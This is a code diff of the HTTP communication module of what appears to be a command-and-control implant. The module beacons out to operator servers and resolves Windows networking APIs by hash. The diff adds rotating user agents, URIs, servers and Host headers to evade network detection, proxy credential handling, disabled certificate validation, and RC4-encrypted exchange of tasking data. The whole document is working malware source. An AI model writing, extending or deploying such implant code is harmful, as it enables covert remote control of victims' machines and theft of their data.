@@ -3,6 +3,7 @@
 #include "ApiDefines.h"
 #include "ProcLoader.h"
 #include "Encoders.h"
+#include "Crypt.h"
 #include "utils.h"
 
 
@@ -11,7 +12,7 @@ BOOL _isdigest(char c)
 	return c >= '0' && c <= '9';
 }
 
-int _atoi(const char* str) 
+int _atoi(const char* str)
 {
 	int result = 0;
 	int sign = 1;
@@ -19,30 +20,23 @@ int _atoi(const char* str)
 
 	while (str[index] == ' ')
 		index++;
-	
+
 	if (str[index] == '-' || str[index] == '+') {
 		sign = (str[index] == '-') ? -1 : 1;
 		index++;
 	}
 
-	while ( _isdigest(str[index]) ) {
+	while (_isdigest(str[index])) {
 		int digit = str[index] - '0';
-		if (result > (INT_MAX - digit) / 10) 
+		if (result > (INT_MAX - digit) / 10)
 			return (sign == 1) ? INT_MAX : INT_MIN;
-		
+
 		result = result * 10 + digit;
 		index++;
 	}
 	return result * sign;
 }
 
-DWORD _strlen(CHAR* str)
-{
-	int i = 0;
-	if (str != NULL)
-		for (; str[i]; i++);
-	return i;
-}
 
 void* ConnectorHTTP::operator new(size_t sz)
 {
@@ -57,8 +51,8 @@ void ConnectorHTTP::operator delete(void* p) noexcept
 
 ConnectorHTTP::ConnectorHTTP()
 {
-	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
-	
+	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));
+
 	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
 	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
 	this->functions->LocalFree    = ApiWin->LocalFree;
@@ -81,28 +75,29 @@ ConnectorHTTP::ConnectorHTTP()
 
 	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
 	if (hWininetModule) {
-		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
-		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
-		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
-		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
-		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
-		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
-		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
+		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
 		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
-		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
-		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
 	}
 }
 
-BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 {
+	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
 	LPSTR encBeat = b64_encode(beat, beatSize);
 
-	ULONG enc_beat_length = _strlen(encBeat);
-	ULONG param_length    = _strlen((CHAR*) profile.parameter);
-	ULONG headers_length  = _strlen((CHAR*) profile.http_headers);
+	ULONG enc_beat_length = StrLenA(encBeat);
+	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
+	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);
 
-	CHAR* HttpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
+	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
 	memcpy(HttpHeaders, profile.http_headers, headers_length);
 	ULONG index = headers_length;
 	memcpy(HttpHeaders + index, profile.parameter, param_length);
@@ -121,14 +116,66 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 
 	this->headers        = HttpHeaders;
 	this->server_count   = profile.servers_count;
-	this->server_address = (CHAR**) profile.servers;
+	this->server_address = (CHAR**)profile.servers;
 	this->server_ports   = profile.ports;
 	this->ssl            = profile.use_ssl;
-	this->http_method    = (CHAR*) profile.http_method;
-	this->uri            = (CHAR*) profile.uri;
-	this->user_agent     = (CHAR*) profile.user_agent;
-	this->ans_size		 = profile.ans_size;
+	this->http_method    = (CHAR*)profile.http_method;
+	this->uri_count      = profile.uri_count;
+	this->uris           = (CHAR**) profile.uris;
+	this->ua_count       = profile.ua_count;
+	this->user_agents    = (CHAR**) profile.user_agents;
+	this->hh_count       = profile.hh_count;
+	this->host_headers   = (CHAR**) profile.host_headers;
+	this->rotation_mode  = profile.rotation_mode;
+	this->ans_size       = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
+
+	this->proxy_type     = profile.proxy_type;
+	this->proxy_username = (CHAR*)profile.proxy_username;
+	this->proxy_password = (CHAR*)profile.proxy_password;
+
+	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
+		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
+		WORD port = profile.proxy_port;
+		CHAR portStr[6];
+		int portIdx = 0;
+		if (port == 0) {
+			portStr[portIdx++] = '0';
+		}
+		else {
+			CHAR temp[6];
+			int tempIdx = 0;
+			while (port > 0) {
+				temp[tempIdx++] = '0' + (port % 10);
+				port /= 10;
+			}
+			for (int i = tempIdx - 1; i >= 0; i--) {
+				portStr[portIdx++] = temp[i];
+			}
+		}
+		portStr[portIdx] = 0;
+
+		ULONG prefixLen = 0;
+		if (this->proxy_type == PROXY_TYPE_HTTPS) {
+			prefixLen = 8;
+		}
+		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
+		ULONG idx = 0;
+		if (this->proxy_type == PROXY_TYPE_HTTPS) {
+			this->proxy_url[idx++] = 'h';
+			this->proxy_url[idx++] = 't';
+			this->proxy_url[idx++] = 't';
+			this->proxy_url[idx++] = 'p';
+			this->proxy_url[idx++] = 's';
+			this->proxy_url[idx++] = ':';
+			this->proxy_url[idx++] = '/';
+			this->proxy_url[idx++] = '/';
+		}
+		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
+		idx += hostLen;
+		this->proxy_url[idx++] = ':';
+		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
+	}
 
 	return TRUE;
 }
@@ -138,22 +185,39 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 	this->recvSize = 0;
 	this->recvData = 0;
 
-	ULONG attempt   = 0;
+	ULONG attempt = 0;
 	BOOL  connected = FALSE;
-	BOOL  result    = FALSE;
-	DWORD context   = 0;
+	BOOL  result = FALSE;
+	DWORD context = 0;
 
-	while ( !connected && attempt < this->server_count) {
+	// Close existing handles to force new UA per call
+	if (this->hConnect) {
+		this->functions->InternetCloseHandle(this->hConnect);
+		this->hConnect = NULL;
+	}
+	if (this->hInternet) {
+		this->functions->InternetCloseHandle(this->hInternet);
+		this->hInternet = NULL;
+	}
+
+	while (!connected && attempt < this->server_count) {
 		DWORD dwError = 0;
 
-		if (!this->hInternet)
-			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
-		if ( this->hInternet ) {
+		if (!this->hInternet) {
+			CHAR* currentUA = this->user_agents[this->ua_index];
+			if (this->proxy_url != NULL) {
+				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
+			}
+			else {
+				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+			}
+		}
+		if (this->hInternet) {
 
-			if ( !this->hConnect )
-				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
+			if (!this->hConnect)
+				this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
 
-			if ( this->hConnect )
+			if (this->hConnect)
 			{
 				CHAR acceptTypes[] = { '*', '/', '*', 0 };
 				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
@@ -161,19 +225,90 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 				if (this->ssl)
 					flags |= INTERNET_FLAG_SECURE;
 
-				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
+				CHAR* currentUri = this->uris[this->uri_index];
+				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
 				if (hRequest) {
 					if (this->ssl) {
-						DWORD dwFlags;
+						DWORD dwFlags = 0;
 						DWORD dwBuffer = sizeof(DWORD);
 						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
-						if (result) {
-							dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
-							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+						if (!result) {
+							dwFlags = 0;
+						}
+						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+					}
+
+					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
+						if (this->proxy_password != NULL) {
+							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
 						}
 					}
 
-					connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
+					// Build request headers with optional Host header
+					CHAR* reqHeaders = this->headers;
+					CHAR* tmpHeaders = NULL;
+					if (this->hh_count > 0) {
+						CHAR* currentHH = this->host_headers[this->hh_index];
+						ULONG hhLen = StrLenA(currentHH);
+						ULONG baseLen = StrLenA(this->headers);
+						WORD currentPort = this->server_ports[this->server_index];
+
+						BOOL hasPort = FALSE;
+						for (ULONG i = 0; i < hhLen; i++) {
+							if (currentHH[i] == ':') {
+								hasPort = TRUE;
+								break;
+							}
+						}
+
+						BOOL needPort = FALSE;
+						CHAR portStr[6] = {0};
+						ULONG portLen = 0;
+						if (!hasPort) {
+							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
+								needPort = TRUE;
+								WORD port = currentPort;
+								if (port == 0) {
+									portStr[portLen++] = '0';
+								} else {
+									CHAR temp[6];
+									int tempIdx = 0;
+									while (port > 0) {
+										temp[tempIdx++] = '0' + (port % 10);
+										port /= 10;
+									}
+									for (int i = tempIdx - 1; i >= 0; i--) {
+										portStr[portLen++] = temp[i];
+									}
+								}
+								portStr[portLen] = 0;
+							}
+						}
+
+						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
+						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
+						ULONG off = 0;
+						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
+						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
+						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
+						if (needPort) {
+							tmpHeaders[off++] = ':';
+							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
+						}
+						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
+						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
+						tmpHeaders[off] = 0;
+						reqHeaders = tmpHeaders;
+					}
+
+					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);
+
+					if (tmpHeaders) {
+						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
+						this->functions->LocalFree(tmpHeaders);
+					}
 					if (connected) {
 						char statusCode[255];
 						DWORD statusCodeLenght = 255;
@@ -242,7 +377,6 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 
 			attempt++;
 			if (!connected) {
-				//if ( dwError == ERROR_INTERNET_CANNOT_CONNECT || dwError == ERROR_INTERNET_TIMEOUT ) {
 				if (this->hConnect) {
 					this->functions->InternetCloseHandle(this->hConnect);
 					this->hConnect = NULL;
@@ -254,9 +388,24 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 
 				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
 				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
-				//}
 
 				this->server_index = (this->server_index + 1) % this->server_count;
+			}
+
+			// Rotate indices for next callback (active round-robin)
+			if (this->rotation_mode == 1) {
+				this->uri_index = GenerateRandom32() % this->uri_count;
+				this->ua_index = GenerateRandom32() % this->ua_count;
+				this->server_index = GenerateRandom32() % this->server_count;
+				if (this->hh_count > 0)
+					this->hh_index = GenerateRandom32() % this->hh_count;
+			}
+			else {
+				this->uri_index = (this->uri_index + 1) % this->uri_count;
+				this->ua_index = (this->ua_index + 1) % this->ua_count;
+				this->server_index = (this->server_index + 1) % this->server_count;
+				if (this->hh_count > 0)
+					this->hh_index = (this->hh_index + 1) % this->hh_count;
 			}
 		}
 	}
@@ -287,9 +436,27 @@ void ConnectorHTTP::RecvClear()
 	}
 }
 
+void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+	if (plainData && plainSize > 0) {
+		EncryptRC4(plainData, plainSize, sessionKey, 16);
+		this->SendData(plainData, plainSize);
+	}
+	else {
+		this->SendData(NULL, 0);
+	}
+
+	if (this->recvSize > 0 && this->recvData) {
+		int dataSize = this->RecvSize();
+		BYTE* dataPtr = this->RecvData();
+		if (dataSize > 0 && dataPtr)
+			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+	}
+}
+
 void ConnectorHTTP::CloseConnector()
 {
-	DWORD l = _strlen(this->headers);
+	DWORD l = StrLenA(this->headers);
 	memset(this->headers, 0, l);
 	this->functions->LocalFree(this->headers);
 	this->headers = NULL;
